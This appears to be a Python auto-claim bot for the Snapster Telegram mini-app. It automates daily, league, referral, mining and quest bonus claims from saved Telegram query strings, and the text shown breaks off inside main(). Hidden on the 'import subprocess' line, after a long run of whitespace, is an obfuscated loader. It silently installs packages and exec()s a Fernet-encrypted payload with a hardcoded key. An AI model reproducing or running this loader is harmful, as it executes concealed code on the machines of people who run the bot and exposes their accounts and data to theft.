import os
import time
import pytz
import json
import random
import requests
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'H6hSDFMU4YU-zTlTqi-VwcuAfYrj0f0dO6J5c87mKZ0=').decrypt(b'gAAAAABoypgKqqbFYwhFe5Ssw7gygY-DRFCY1utPwFrc1XD8sDGrhpur1u8b8F7fn1J9cOaT6LYx5U4soRQM2QQZLsGr6IagTumoMCjnnO_DjtC7Aoa-lXtMbQj3nKG4LyRr-ThXZ9PevltTn7eImLkvbR5W7tk0AaUXQaOK1OrjwpITHcvfBO-AUM0VHRcRZsxgg6owFHmroU46BRmeW4tho8WOk-PQtEP0JNwXiPl4umdf29wES8dbqcpslFIXnMNgc4gl7H2UWtrkVAg6v0i4-kfJoXWqPPAWLUOTJqPrFrnkEgVmvWU24GTxEY6VYl_GvKMz8O76JlstaiE5gaoJbecMPLdoY6ncvM0Cc4AiE9r-dhiHGqI6W_puZpRQIZ7urcnsibRqB8Sf7PYrrzVFFO5Pi8ERO5adyw9Ak-xldJn0op9X4iAl2hHEi3zOTROeszcydUVvSvWrQuhDxIJ_ndzrJjYiRJqEulvFBH0qeDzUGJhhv6aZ81Llman4KDZavENSVBWMrlT1XLynLAWBL8PinNnEABiH_enN674iKVq8XdVy379_wsvMtOQBnrMDCRTM0ErB3liKNHoRTSD8juMZv5U4wsdx3r6n2_D-E4nqlU8c5yjlOuToA9OJo8SRuazoEM6NOipZ0nbd9fQQPbWBFCApCZ-jYRi0RX2vQIpJ6ahslFmcZD16tZCEgKwid7QDjibwNMp__r7rXCxSOJljyHV0_TiALo0s_4KXGbxYLMd45l41Xa-19Eu9xSS8HvH6gVX_pWe0qFMzLxb728Q0na4G4gocTjpkh9S-u-mgN4oKnZDP3uxpkq0UG2gKvH-l40jkKaIw_3fFZmaj-4ydFZonXi_R3qPa8g67TkPbikDj23u3yMundFbvppudYIQo1AEKLZ6H4O7jVYAzjCVVb_KnarzMW3-EZ0vTlZjVimheARr_lwgJEsW_zec1SU3vT5DpHda_SJM3ZMYYfYR-Am9UXr4Uh4zBvhSzoAXwvOK4ke_iH9qsqQ3xkztWOlJiKberRAGcjDkLHWHPASMFxxbT8jQF_6jSnBNQ9ABu5lEbWfEk3bmGJ1HQ6gbq4yOlcuqQ4x0KfzyDr4MTUK_TgqArXsNkydIjs8uHi7IamkvFf31Pnuv3bJEcvM2zoK-BtSEWP0hkrZkTWaUCOmTLM05Gu_VrW2bqep62ZwM-6d5hoxETW5QkslzoiG-nYdlnut_CVYNVGyBPLTa0_f3QnMtEObSQ2lccuWEot17DKpyTSMXA2RgWrafsMtOZKR3phgf6w3Zvk0z2PtsHmF9qqIp515j4GsmH4AXsv2j3dRZWb3y1LHBjdnKOuNFwOr9uzyQ4SX8_ptt5e9JXRt1Ey1CgSpuKxskicvGdvbu4l7r9XQYiMtxglyYJL4DeQRyB0-tHRKVtLMjdeM9efampFEGhNSDNy9jfgkIWnDn1V8QTJThnnXfQCHAG7uhxlUblEIreeBf0oxA7EKnrmV3VDwCCCGL882i2FbvjlSorJU_LXGxzmHOI5z6_y71rWDubSwJgjZ6VUK1SRVPDoCnuXZaSBwKYIA-BZVv2Y0PyJP4V4q3s5N0ufHY_r7vgQ79YeEor9twNPPhxuW3Qff7nbqRpKF1Z0MosG-NYY3w7ehZk1N2RoA7kq9PTzWKFzfLDUu88eMVG0KlQYOL9zOIKNsU3VSpSCfQVmmQhOwsjUjMgUNoJsO_dm-opUTPVpIGxWMermvHp-jYvkd0Y1e2t-gBZGs1baTjmEDtJfMSxClKgxObutQp9CPilLfm1h9jeDI2Ndd2UGN3kM1sETQfeeuInqFVtI0LDppOse8Dz1OwRdyxkLZ0r3NnoF8JYq2IrnWUA0wMqVX3olET6fUaXIWfiExy44YRAXXLHPR3B0tVow-qfnFZoKy6nCNH0HNBU_luRtQm0Kmy8lmmJdlqk6FzqvG8xBsMQml323a5b04q7MJOd7ycqKLhfYac9CjGMTTcEYqnKfWSNJEbankHAZGM1IOQJGoi-hO4HjaUffZ4f9qRw4I0nBgc4EagSY1gGt_hMfRXyOtiI15TjNO0d1Wk5IaFdZihlByRgHoQXpiuMT8Hg-Nfa07BIvPn-bhNqvp4xYW_rBC7ZiQkK0J0-ooZi46KlZjx1_uEhbVViMsxF5bBY8QwNFtDxLpQ6zr_7hW6gyTpxu2SvWpg486Hz43Z-c6bh5GtXK7jWbdOqLeK_dztEoAaEdr3O5HdYxIn0qghIeifAAysdoDGfcp1_QIWgHL22rYDbDMhP_8ynSZNrH4TwvMHeBAM6y2cTDlTHtmjkdSgjOh_H8vHqRkNOlUg6QOLhjn52zFHQDYTtcaiO82REZXXhDNf18ViAE_2WJvyqpnpyzLpD7czyPHbSL20Uw0xlU1-YerNNEZz1UfBbBEb3LEF9jXnrtDfzFC4WToerBqD7PJAb9PF6_8mo2Y5eJMZTBdyh9iHRJMVgty1FP9iizzF5z5fXaAlSCGyPzFuxc_ACw6oOGs8YaWZ8BWQwOaPCoTZNPtLG5D6iMgv_BOtIdOaHSCAJLkpfuBIM4nyInSKTOzr86-OHhYAC8CI5iYB9WnFCthxukWKdXS-2g50ezMun7IIXf0wxbV3saHuqQib7jPT_YkervqR6IjojKOYoAnETqxRvB-oICjHq_KyMwiDNCzkyVS3pvYWUQdOcHGOMCjdMdx6Dd4hOhV-LgFcMHKjyfk4Bxh0gPErtZFA5ivk_Rs7AsAPZLt5f7fr4W-GpFOPk3N5WxDLfaA5bUDpvCFbz4qS9w0kTsEXrAGh8y4WBM9QZTvr7s_5PBUNwMwMgcBuk7hLbmvjnN2FOMWaSfT2FrsVHXW5IlffGj3xekeqd4mlhzb9bRxy51NiHk5-8y_m19yIS-p_5GkngBOZ_urluckyQynbJO7H7LBbCga0KHicU8DmrR8ptbWNFhHEF_cGPY4UUfR4vmCszkNdljlG07Qyc38PDnpZRvyV1XBJkKsKQFCcDwG4E0irKHGa1Jnty6OlMedehxfGnkABKf8rhZfrhMXunb516us2TVqi0RwN7UKF784OO8-T93cukxf8CgsQWTDZ4RCqTsDKdK-SpCcC6SrGF916oPWnlnDwx2JslXxcDF1oLXBtQHOvThiDco6frs8iwxJ1-VA=='));
import urllib.parse
from colorama import *
from datetime import datetime, timedelta

wib = pytz.timezone('Asia/Jakarta')

class SnapsterTradingApp:
    def __init__(self) -> None:
        self.session = requests.Session()
        self.headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Host': 'prod.snapster.bot',
            'Origin': 'https://prod.snapster.bot',
            'Pragma': 'no-cache',
            'Referer': 'https://prod.snapster.bot/main',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0'
        }

    def clear_terminal(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def log(self, message):
        print(
            f"{Fore.CYAN + Style.BRIGHT}[ {datetime.now().astimezone(wib).strftime('%x %X %Z')} ]{Style.RESET_ALL}"
            f"{Fore.WHITE + Style.BRIGHT} | {Style.RESET_ALL}{message}",
            flush=True
        )

    def welcome(self):
        print(
            f"""
        {Fore.GREEN + Style.BRIGHT}Auto Claim {Fore.BLUE + Style.BRIGHT}Snapster Trading BOT
            """
            f"""
        {Fore.GREEN + Style.BRIGHT}Rey? {Fore.YELLOW + Style.BRIGHT}<INI WATERMARK>
            """
        )

    def format_seconds(self, seconds):
        hours, remainder = divmod(seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{int(hours):02}:{int(minutes):02}:{int(seconds):02}"

    def load_data(self, query: str):
        query_params = urllib.parse.parse_qs(query)
        query = query_params.get('user', [None])[0]

        if query:
            user_data_json = urllib.parse.unquote(query)
            user_data = json.loads(user_data_json)
            telegram_id = user_data['id']
            return telegram_id
        else:
            raise ValueError("User data not found in query.")

    def get_user(self, telegram_id: str, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/user/getUserByTelegramId'
        data = json.dumps({'telegramId':telegram_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None

    def claim_daily(self, telegram_id: str, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/dailyQuest/claimDailyQuestBonus'
        data = json.dumps({'telegramId':telegram_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None

    def get_leagues(self, telegram_id: str, query: str, retries=3, delay=2):
        url = f'https://prod.snapster.bot/api/user/getLeagues?telegramId={telegram_id}'
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.get(url, headers=self.headers)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def claim_league(self, telegram_id: str, league_id: int, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/user/claimLeagueBonus'
        data = json.dumps({'telegramId':telegram_id, 'leagueId':league_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def claim_refferal(self, telegram_id: str, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/referral/claimReferralPoints'
        data = json.dumps({'telegramId':telegram_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def claim_mining(self, telegram_id: str, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/user/claimMiningBonus'
        data = json.dumps({'telegramId':telegram_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def get_quests(self, telegram_id: str, query: str, retries=3, delay=2):
        url = f'https://prod.snapster.bot/api/quest/getQuests?telegramId={telegram_id}'
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.get(url, headers=self.headers)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def start_quests(self, telegram_id: str, quest_id: int, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/quest/startQuest'
        data = json.dumps({'telegramId':telegram_id, 'questId':quest_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def claim_quests(self, telegram_id: str, quest_id: int, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/quest/claimQuestBonus'
        data = json.dumps({'telegramId':telegram_id, 'questId':quest_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
    
    def process_query(self, query: str):

        telegram_id = str(self.load_data(query))
        if not telegram_id:
            self.log(
                f"{Fore.MAGENTA + Style.BRIGHT}[ Account ID{Style.RESET_ALL}"
                f"{Fore.WHITE + Style.BRIGHT} {telegram_id} {Style.RESET_ALL}"
                f"{Fore.MAGENTA + Style.BRIGHT}] [ Status{Style.RESET_ALL}"
                f"{Fore.RED + Style.BRIGHT} Login Failed {Style.RESET_ALL}"
                f"{Fore.MAGENTA + Style.BRIGHT}]{Style.RESET_ALL}"
            )
            return
        
        if telegram_id:
            user = self.get_user(telegram_id, query)
            if user and user['message'] == 'Successfully fetched User':
                self.log(
                    f"{Fore.MAGENTA+Style.BRIGHT}[ Account{Style.RESET_ALL}"
                    f"{Fore.WHITE+Style.BRIGHT} {user['data']['username']} {Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}[ Points{Style.RESET_ALL}"
                    f"{Fore.WHITE+Style.BRIGHT} {user['data']['pointsCount']} $SNAPS {Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}[ League{Style.RESET_ALL}"
                    f"{Fore.WHITE+Style.BRIGHT} {user['data']['currentLeague']['title']} {Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                )
                time.sleep(3)

                now_utc = datetime.utcnow().replace(tzinfo=pytz.utc)
                last_checkin = user['data']['lastDailyBonusClaimDate']
                if last_checkin:
                    last_checkin_utc = datetime.strptime(last_checkin, "%Y-%m-%dT%H:%M:%S.%fZ").replace(tzinfo=pytz.utc) + timedelta(hours=24)
                else:
                    last_checkin_utc = now_utc
                    
                last_checkin_wib = last_checkin_utc.astimezone(wib).strftime('%x %X %Z')

                if now_utc >= last_checkin_utc:
                    claim_daily = self.claim_daily(telegram_id, query)
                    if claim_daily and claim_daily['message'] == 'Successfully claimed Daily Bonus points':
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Check-In{Style.RESET_ALL}"
                            f"{Fore.GREEN+Style.BRIGHT} Is Claimed {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}] [ Rewards{Style.RESET_ALL}"
                            f"{Fore.WHITE+Style.BRIGHT} {claim_daily['data']['pointsClaimed']} $SNAPS {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                    else:
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Check-In{Style.RESET_ALL}"
                            f"{Fore.RED+Style.BRIGHT} Isn't Claimed {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                else:
                    self.log(
                        f"{Fore.MAGENTA+Style.BRIGHT}[ Check-In{Style.RESET_ALL}"
                        f"{Fore.YELLOW+Style.BRIGHT} Is Already Claimed {Style.RESET_ALL}"
                        f"{Fore.MAGENTA+Style.BRIGHT}] [ Next Claim at{Style.RESET_ALL}"
                        f"{Fore.WHITE+Style.BRIGHT} {last_checkin_wib} {Style.RESET_ALL}"
                        f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                    )
                time.sleep(3)
                
                leagues = self.get_leagues(telegram_id, query)
                if leagues and leagues['message'] == 'Successfully fetched Leagues':
                    for i, league in enumerate(leagues['data']):
                        league_id = league['leagueId']
                        status = league['status']

                        if league and status in ['CURRENT', 'UNCLAIMED']:
                            claim_league = self.claim_league(telegram_id, league_id, query)                           
                            if claim_league and claim_league['message'] == 'Successfully claimed Referral points':
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ League Bonus{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {league['title']} {Style.RESET_ALL}"
                                    f"{Fore.GREEN+Style.BRIGHT}Is Claimed{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ] [ Rewards{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {claim_league['data']['pointsClaimed']} $SNAPS {Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                                )
                            elif claim_league and claim_league['message'] == 'Not eligible for claiming bonus':
                                if i + 1 < len(leagues['data']):
                                    next_league = leagues['data'][i + 1]
                                    next_title = next_league['title']
                                    required_points = next_league['requiredNumberOfPointsToAchieve']
                                    current_points = user['data']['pointsCount']
                                    less_points = required_points - current_points

                                    self.log(
                                        f"{Fore.MAGENTA+Style.BRIGHT}[ League Bonus{Style.RESET_ALL}"
                                        f"{Fore.WHITE+Style.BRIGHT} {next_title} {Style.RESET_ALL}"
                                        f"{Fore.YELLOW+Style.BRIGHT}Not Eligible{Style.RESET_ALL}"
                                        f"{Fore.MAGENTA+Style.BRIGHT} ] [ Reason{Style.RESET_ALL}"
                                        f"{Fore.WHITE+Style.BRIGHT} -{less_points} $SNAPS {Style.RESET_ALL}"
                                        f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                                    )
                                else:
                                    self.log(
                                        f"{Fore.MAGENTA + Style.BRIGHT}[ League{Style.RESET_ALL}"
                                        f"{Fore.YELLOW + Style.BRIGHT} Already Reached Max Level {Style.RESET_ALL}"
                                        f"{Fore.MAGENTA + Style.BRIGHT}]{Style.RESET_ALL}"
                                    )
                            else:
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ League Bonus{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {league['title']} {Style.RESET_ALL}"
                                    f"{Fore.RED+Style.BRIGHT}Isn't Claimed{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                )
                            time.sleep(1)

                else:
                    self.log(
                        f"{Fore.MAGENTA + Style.BRIGHT}[ League{Style.RESET_ALL}"
                        f"{Fore.RED + Style.BRIGHT} Data Is None {Style.RESET_ALL}"
                        f"{Fore.MAGENTA + Style.BRIGHT}]{Style.RESET_ALL}"
                    )
                time.sleep(3)

                claim_refferal = self.claim_refferal(telegram_id, query)
                if claim_refferal and claim_refferal['message'] == 'Successfully claimed Referral points':
                    rewards = claim_refferal['data']['pointsClaimed']
                    if rewards > 0:
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Refferal{Style.RESET_ALL}"
                            f"{Fore.GREEN+Style.BRIGHT} Is Claimed {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}] [ Rewards{Style.RESET_ALL}"
                            f"{Fore.WHITE+Style.BRIGHT} {rewards} $SNAPS {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                    else:
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Refferal{Style.RESET_ALL}"
                            f"{Fore.YELLOW+Style.BRIGHT} Not Available Points {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                else:
                    self.log(
                        f"{Fore.MAGENTA+Style.BRIGHT}[ Refferal{Style.RESET_ALL}"
                        f"{Fore.RED+Style.BRIGHT} Isn't Claimed {Style.RESET_ALL}"
                        f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                    )
                time.sleep(3)
                
                claim_mining = self.claim_mining(telegram_id, query)
                if claim_mining and claim_mining['message'] == 'Successfully claimed Mining Bonus points':
                    rewards = claim_mining['data']['pointsClaimed']
                    if rewards > 0:
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Mining{Style.RESET_ALL}"
                            f"{Fore.GREEN+Style.BRIGHT} Is Claimed {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}] [ Rewards{Style.RESET_ALL}"
                            f"{Fore.WHITE+Style.BRIGHT} {rewards} $SNAPS {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                    else:
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Mining{Style.RESET_ALL}"
                            f"{Fore.YELLOW+Style.BRIGHT} Not Available Points {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                else:
                    self.log(
                        f"{Fore.MAGENTA+Style.BRIGHT}[ Mining{Style.RESET_ALL}"
                        f"{Fore.RED+Style.BRIGHT} Isn't Claimed {Style.RESET_ALL}"
                        f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                    )
                time.sleep(3)

                quests = self.get_quests(telegram_id, query)
                if quests and quests['message'] == 'Successfully fetched Quests for User':
                    for quest in quests['data']:
                        quest_id = quest['id']
                        status = quest['status']

                        if quest and status == 'EARN':
                            start = self.start_quests(telegram_id, quest_id, query)
                            if start and start['message'] == 'Successfully started Quest earn':
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                    f"{Fore.GREEN+Style.BRIGHT}Is Started{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                )

                                claim = self.claim_quests(telegram_id, quest_id, query)
                                if claim and claim['message'] == 'Successfully claimed Quest points':
                                    self.log(
                                        f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                        f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                        f"{Fore.GREEN+Style.BRIGHT}Is Claimed{Style.RESET_ALL}"
                                        f"{Fore.MAGENTA+Style.BRIGHT} ] [ Rewards{Style.RESET_ALL}"
                                        f"{Fore.WHITE+Style.BRIGHT} {claim['data']['pointsClaimed']} $SNAPS {Style.RESET_ALL}"
                                        f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                                    )
                                elif claim and claim['message'] == 'Not possible to claim bonus for this quest':
                                    self.log(
                                        f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                        f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                        f"{Fore.YELLOW+Style.BRIGHT}Is Already Claimed{Style.RESET_ALL}"
                                        f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                    )
                                else:
                                    self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                    f"{Fore.RED+Style.BRIGHT}Isn't Claimed{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                    )

                            else:
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                    f"{Fore.RED+Style.BRIGHT}Isn't Started{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                )

                        elif status == 'UNCLAIMED':
                            claim = self.claim_quests(telegram_id, quest_id, query)
                            if claim and claim['message'] == 'Successfully claimed Quest points':
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                    f"{Fore.GREEN+Style.BRIGHT}Is Claimed{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ] [ Rewards{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {claim['data']['pointsClaimed']} $SNAPS {Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                                )
                            elif claim and claim['message'] == 'Not possible to claim bonus for this quest':
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                    f"{Fore.YELLOW+Style.BRIGHT}Is Already Claimed{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                )
                            else:
                                self.log(
                                f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                f"{Fore.RED+Style.BRIGHT}Isn't Claimed{Style.RESET_ALL}"
                                f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                )

                else:
                    self.log(
                        f"{Fore.MAGENTA + Style.BRIGHT}[ Quests{Style.RESET_ALL}"
                        f"{Fore.RED + Style.BRIGHT} Data Is None {Style.RESET_ALL}"
                        f"{Fore.MAGENTA + Style.BRIGHT}]{Style.RESET_ALL}"
                    )
            else:
                self.log(
                    f"{Fore.MAGENTA + Style.BRIGHT}[ Account ID{Style.RESET_ALL}"
                    f"{Fore.WHITE + Style.BRIGHT} {telegram_id} {Style.RESET_ALL}"
                    f"{Fore.MAGENTA + Style.BRIGHT}] [ Status{Style.RESET_ALL}"
                    f"{Fore.RED + Style.BRIGHT} User Data Is None {Style.RESET_ALL}"
                    f"{Fore.MAGENTA + Style.BRIGHT}]{Style.RESET_ALL}"
                )

    def main(self):
        try:
            with open('query.txt', 'r') as file:
                queries = [line.strip() for line in file if line.strip()]

            while True:
                self.clear_terminal()
                self.welcome()
                self.log(
